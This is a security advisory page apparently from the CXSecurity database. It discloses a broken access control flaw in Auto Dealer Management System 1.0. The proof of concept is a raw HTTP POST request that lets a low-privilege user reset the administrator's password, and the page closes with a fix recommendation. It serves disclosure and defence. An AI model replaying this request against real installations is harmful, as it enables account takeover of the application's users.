---
title: Auto Dealer Management System 1.0 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023020042
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-27
fetch_date: 2025-10-04T08:09:51.388420
---

# Auto Dealer Management System 1.0 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Auto Dealer Management System 1.0 Privilege Escalation** **2023.02.26**  Credit:  **[Navaid Ansari](https://cxsecurity.com/author/Navaid%2BAnsari/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Auto Dealer Management System - Broken Access Control leads to compromise of all application accounts by accessing the ?page=user/list with low privileged user account
### Date:
> 18 February 2023
### Author Email:
> navaidnasari@hotmail.co.uk
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Auto Dealer Management System](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### Broken Authentication:
> Broken Access Control is a type of security vulnerability that occurs when a web application fails to properly restrict users' access to certain resources and functionality. Access control is the process of ensuring that users are authorized to access only the resources and functionality that they are supposed to. Broken Access Control can occur due to poor implementation of access controls in the application, failure to validate input, or insufficient testing and review.
### Affected Page:
> list.php , manage\_user.php
> On these page, application isn't verifying the authorization mechanism. Due to that, all the parameters are vulnerable to broken access control and low privilege user could view the list of user's and change any user password to access it.
### Description:
> Broken access control allows low privilege attacker to change password of all application users
### Proof of Concept:
> Following steps are involved:
1. Visit the vulnerable page: ?page=user/list
2. Click on Action and Edit the password of Admin
![image](https://user-images.githubusercontent.com/123810418/219884701-0f1feb4f-6c8a-4299-b510-1762461910ee.png)
4. Update the Password and Submit
5. Request:
```
POST /adms/classes/Users.php?f=save HTTP/1.1
Host: localhost
Content-Length: 877
sec-ch-ua: "Chromium";v="109", "Not\_A Brand";v="99"
Accept: \*/\*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfODLB5j55MvB5pGU
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/adms/admin/?page=user/manage\_user&id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c1ig2qf0q44toal7cqbqvikli5
Connection: close
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="id"
1
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="firstname"
Adminstrator
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="middlename"
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="lastname"
Admin
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="username"
admin
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="password"
admin123
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="type"
1
------WebKitFormBoundaryfODLB5j55MvB5pGU
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundaryfODLB5j55MvB5pGU--
```
6. Successful exploit screenshots are below (without cookie parameter)
![image](https://user-images.githubusercontent.com/123810418/219884923-5283fca6-d509-4c48-9db0-f61ea6dbb352.png)
7. Vulnerable Code Snippets:
![image](https://user-images.githubusercontent.com/123810418/219884994-e74d7d48-4d45-4135-9a38-45e26c65434b.png)
![image](https://user-images.githubusercontent.com/123810418/219885023-a76afbe0-88f0-4aaa-89cd-1e541e511427.png)
### Recommendation:
> Whoever uses this CMS, should update the authorization mechanism on top of the list.php , manage\_user.php pages as per requirement to avoid a Broken Access Control attack
Thank you for reading for more demo visit my github: https://github.com/navaidzansari/CVE\_Demo

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020042)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top